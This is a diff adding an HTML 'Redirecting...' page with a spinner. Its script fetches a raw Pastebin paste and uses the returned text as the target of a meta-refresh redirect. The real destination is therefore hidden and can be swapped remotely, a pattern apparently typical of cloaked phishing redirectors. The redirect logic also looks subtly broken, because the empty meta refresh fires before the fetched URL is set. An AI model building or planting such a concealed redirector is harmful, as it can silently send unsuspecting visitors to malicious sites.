@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirecting...</title>
+  <style>
+    body {
+      background-color: #f0f0f0;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+  .loading-container {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+  .loading-animation {
+      border: 5px solid #ccc;
+      border-top: 5px solid #333;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="loading-container">
+    <div class="loading-animation"></div>
+    <p>Please wait while we redirect you...</p>
+  </div>
+  <script>
+    fetch('https://pastebin.com/raw/Rxp3YVKh')
+     .then(response => response.text())
+     .then(url => {
+        document.querySelector('meta[http-equiv="refresh"]').setAttribute('content', `0; url=${url}`);
+      });
+  </script>
+  <meta http-equiv="refresh" content="0; url=">
+</body>
+</html>
